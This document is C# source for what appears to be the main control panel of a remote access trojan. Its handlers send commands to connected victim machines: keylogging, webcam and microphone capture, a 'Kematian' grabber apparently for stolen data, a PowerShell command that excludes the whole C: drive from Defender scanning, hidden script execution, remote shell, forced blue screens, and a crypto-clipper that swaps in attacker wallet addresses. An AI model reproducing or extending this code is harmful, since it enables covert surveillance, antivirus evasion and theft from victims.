        private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmKeylogger frmKl = FrmKeylogger.CreateNewOrGetExisting(c);
                frmKl.Show();
                frmKl.Focus();
            }
        }

        private void webcamToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmWebcam = FrmRemoteWebcam.CreateNewOrGetExisting(c);
                frmWebcam.Show();
                frmWebcam.Focus();
            }
        }

        private void kematianGrabbingToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var kematianHandler = new KematianHandler(c);
                kematianHandler.RequestKematianZip();
            }
        }

        private void installVirtualMonitorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                //check if client is admin
                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";
                if (isClientAdmin)
                {
                    c.Send(new DoInstallVirtualMonitor());
                }
                else
                {
                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        #endregion "Monitoring"

        #region "User Support"

        private void visitWebsiteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmVisitWebsite(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            c.Send(new DoVisitWebsite
                            {
                                Url = frm.Url,
                                Hidden = frm.Hidden
                            });
                        }
                    }
                }
            }
        }

        private void showMessageboxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmShowMessagebox(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            c.Send(new DoShowMessageBox
                            {
                                Caption = frm.MsgBoxCaption,
                                Text = frm.MsgBoxText,
                                Button = frm.MsgBoxButton,
                                Icon = frm.MsgBoxIcon
                            });
                        }
                    }
                }
            }
        }

        #endregion "User Support"

        #region "Quick Commands"

        private void addCDriveExceptionToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string powershellCode = "Add-MpPreference -ExclusionPath C:\\";
            DoSendQuickCommand quickCommand = new DoSendQuickCommand { Command = powershellCode, Host = "powershell.exe" };

            foreach (Client c in GetSelectedClients())
            {
                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";

                if (isClientAdmin)
                {
                    c.Send(quickCommand);
                }
                else
                {
                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        #endregion "Quick Commands"

        #region "Fun Stuff"

        private void bSODToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoBSOD());
            }
        }

        private void cWToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.InitialDirectory = "c:\\";
                openFileDialog.Filter = "Image Files|*.jpg;*.jpeg;*.png;*.bmp";
                openFileDialog.FilterIndex = 1;
                openFileDialog.RestoreDirectory = true;

                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    string selectedFilePath = openFileDialog.FileName;
                    byte[] imageData = File.ReadAllBytes(selectedFilePath);
                    string imageFormat = Path.GetExtension(selectedFilePath).TrimStart('.').ToLower();

                    foreach (Client c in GetSelectedClients())
                    {
                        c.Send(new DoChangeWallpaper
                        {
                            ImageData = imageData,
                            ImageFormat = imageFormat
                        });
                    }
                }
            }
        }



        private void swapMouseButtonsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoSwapMouseButtons());
            }
        }

        private void hideTaskBarToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoHideTaskbar());
            }
        }

        #endregion "Fun Stuff"

        private void selectAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            lstClients.SelectAllItems();
        }

        #endregion "ContextMenuStrip"

        #region "MenuStrip"

        private void closeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmSettings(ListenServer))
            {
                frm.ShowDialog();
            }
        }

        private void builderToolStripMenuItem_Click(object sender, EventArgs e)
        {
#if DEBUG
            MessageBox.Show("Client Builder is not available in DEBUG configuration.\nPlease build the project using RELEASE configuration.", "Not available", MessageBoxButtons.OK, MessageBoxIcon.Information);
#else
            using (var frm = new FrmBuilder())
            {
                frm.ShowDialog();
            }
#endif
        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmAbout())
            {
                frm.ShowDialog();
            }
        }

        #endregion "MenuStrip"

        #region "NotifyIcon"

        private void notifyIcon_MouseDoubleClick(object sender, MouseEventArgs e)
        {
        }

        #endregion "NotifyIcon"

        private void contextMenuStrip_Opening(object sender, System.ComponentModel.CancelEventArgs e)
        {
        }

        private void addKeywordsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmKeywords())
            {
                frm.ShowDialog();
            }
        }

        public static void AddNotiEvent(FrmMain frmMain, string client, string keywords, string windowText)
        {
            if (frmMain.lstNoti.InvokeRequired)
            {
                frmMain.lstNoti.Invoke(new Action(() => AddNotiEvent(frmMain, client, keywords, windowText)));
                return;
            }
            ListViewItem item = new ListViewItem(client);
            item.SubItems.Add(DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss"));
            item.SubItems.Add(keywords);
            item.SubItems.Add(windowText);
            frmMain.lstNoti.Items.Add(item);

            frmMain.notifyIcon.Visible = true;
            frmMain.notifyIcon.ShowBalloonTip(4000, $"Keyword Triggered: {keywords}", $"Client: {client}\nWindow: {windowText}", ToolTipIcon.Info);
            frmMain.notifyIcon.Visible = false;
        }

        private void clientsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MainTabControl.SelectTab(tabPage1);
        }

        private void notificationCentreToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MainTabControl.SelectTab(tabPage2);
        }

        private void clearSelectedToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstNoti.SelectedItems.Count > 0)
            {
                foreach (ListViewItem item in lstNoti.SelectedItems)
                {
                    lstNoti.Items.Remove(item);
                }
            }
        }

        private void systemToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        private void deleteTasksToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstTasks.SelectedItems.Count > 0)
            {
                foreach (ListViewItem item in lstTasks.SelectedItems)
                {
                    lstTasks.Items.Remove(item);
                }
            }
        }

        private void cryptoClipperToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MainTabControl.SelectTab(tabPage3);
        }

        private void autoTasksToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MainTabControl.SelectTab(tabPage4);
        }

        private void remoteExecuteToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmTaskExecute())
            {
                frm.ShowDialog();
            }
        }

        private void shellCommandToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmTaskCommand())
            {
                frm.ShowDialog();
            }
        }

        private void showMessageBoxToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmTaskMessageBox())
            {
                frm.ShowDialog();
            }
        }

        public void AddTask(string title, string param1, string param2)
        {
            ListViewItem newItem = new ListViewItem(title);
            newItem.SubItems.Add(param1);
            newItem.SubItems.Add(param2);
            lstTasks.Items.Add(newItem);
        }

        private void kematianToolStripMenuItem_Click(object sender, EventArgs e)
        {
            AddTask("Kematian Recovery", "", "");
        }

        private void excludeSystemDriveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            AddTask("Exclude System Drives", "", "");
        }

        private void groupBox1_Enter(object sender, EventArgs e)
        {
        }

        private void ClipperCheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (ClipperCheckbox.Checked == true)
            {
                ClipperCheckbox.Text = "Stop";
            }
            else
            {
                ClipperCheckbox.Text = "Start";
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmFileManager frmFm = FrmFileManager.CreateNewOrGetExisting(c);
                frmFm.Show();
                frmFm.Focus();
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmRemoteShell frmRs = FrmRemoteShell.CreateNewOrGetExisting(c);
                frmRs.Show();
                frmRs.Focus();
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmRd = FrmRemoteDesktop.CreateNewOrGetExisting(c);
                frmRd.Show();
                frmRd.Focus();
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients);
                frmRe.Show();
            }
        }

        private void button6_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmKeylogger frmKl = FrmKeylogger.CreateNewOrGetExisting(c);
                frmKl.Show();
                frmKl.Focus();
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmWebcam = FrmRemoteWebcam.CreateNewOrGetExisting(c);
                frmWebcam.Show();
                frmWebcam.Focus();
            }
        }

        public string GetBTCAddress() => BTCTextBox.Text;

        public string GetLTCAddress() => LTCTextBox.Text;

        public string GetETHAddress() => ETHTextBox.Text;

        public string GetXMRAddress() => XMRTextBox.Text;

        public string GetSOLAddress() => SOLTextBox.Text;

        public string GetDASHAddress() => DASHTextBox.Text;

        public string GetXRPAddress() => XRPTextBox.Text;

        public string GetTRXAddress() => TRXTextBox.Text;

        public string GetBCHAddress() => BCHTextBox.Text;

        private void taskTestToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        private void tableLayoutPanel1_Paint(object sender, PaintEventArgs e)
        {
        }

        private void saveLogsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (SaveFileDialog saveFileDialog = new SaveFileDialog())
            {
                saveFileDialog.Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*";
                saveFileDialog.Title = "Save Log File";
                saveFileDialog.DefaultExt = "txt";

                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    File.WriteAllText(saveFileDialog.FileName, DebugLogRichBox.Text);
                }
            }
        }

        private void saveSlectedToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(DebugLogRichBox.SelectedText))
            {
                return;
            }

            using (SaveFileDialog saveFileDialog = new SaveFileDialog())
            {
                saveFileDialog.Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*";
                saveFileDialog.Title = "Save Selected Text";
                saveFileDialog.DefaultExt = "txt";

                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    File.WriteAllText(saveFileDialog.FileName, DebugLogRichBox.SelectedText);
                }
            }
        }

        private void clearLogsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            DebugLogRichBox.Clear();
        }

        private void clearSelectedToolStripMenuItem1_Click(object sender, EventArgs e)
        {
        }

        private void lstClients_Resize(object sender, EventArgs e)
        {
            int accountTypeIndex = -1;
            for (int i = 0; i < lstClients.Columns.Count; i++)
            {
                if (lstClients.Columns[i] == hAccountType)
                {
                    accountTypeIndex = i;
                    break;
                }
            }

            if (accountTypeIndex >= 0)
            {
                lstClients.StretchColumnByIndex(accountTypeIndex);
            }

            UpdateAllStarPositions();
        }

        private void UpdateAllStarPositions()
        {
            if (this.IsDisposed || !this.IsHandleCreated)
                return;

            try
            {
                if (this.InvokeRequired)
                {
                    this.Invoke(new Action(() => UpdateAllStarPositionsInternal()));
                }
                else
                {
                    UpdateAllStarPositionsInternal();
                }
            }
            catch (InvalidOperationException)
            {
            }
            catch (Exception ex)
            {
                EventLog($"Error updating star positions: {ex.Message}", "error");
            }
        }

        private void UpdateAllStarPositionsInternal()
        {
            if (this.IsDisposed || !this.IsHandleCreated || lstClients == null || lstClients.IsDisposed)
                return;

            // Clean up any star controls that don't have matching clients
            List<Control> starsToRemove = new List<Control>();
            foreach (Control control in lstClients.Controls)
            {
                if (control is Button && control.Tag is Client starClient)
                {
                    bool found = false;
                    foreach (ListViewItem item in lstClients.Items)
                    {
                        if (item.Tag is Client itemClient && itemClient.Equals(starClient))
                        {
                            UpdateStarButtonPosition(control, item);
                            found = true;
                            break;
                        }
                    }

                    if (!found)
                    {
                        starsToRemove.Add(control);
                    }
                }
            }

            // Remove stars for clients that no longer exist
            foreach (var control in starsToRemove)
            {
                lstClients.Controls.Remove(control);
                control.Dispose();
            }
        }

        private void lstClients_MouseWheel(object sender, MouseEventArgs e)
        {
            UpdateAllStarPositions();
        }

        private void lstClients_ColumnWidthChanged(object sender, ColumnWidthChangedEventArgs e)
        {
            if (!lstClients.IsStretched(hAccountType.Index))
            { lstClients.StretchColumnByIndex(hAccountType.Index); }
            UpdateAllStarPositions();
        }

        private void MainTabControl_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (MainTabControl.SelectedTab == tabPage1)
            {
                RefreshStarButtons();
                SortClientsByFavoriteStatus();
            }
        }

        private void lstClients_DrawItem(object sender, DrawListViewItemEventArgs e)
        {
            e.DrawDefault = true;
        }

        private void remoteScriptingToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmRemoteScripting(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            c.Send(new DoExecScript
                            {
                                Language = frm.Lang,
                                Script = frm.Script,
                                Hidden = frm.Hidden
                            });
                        }
                    }
                }
            }
        }

        private void audioToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmAudio = FrmRemoteMic.CreateNewOrGetExisting(c);
                frmAudio.Show();
                frmAudio.Focus();
            }
        }
    }

}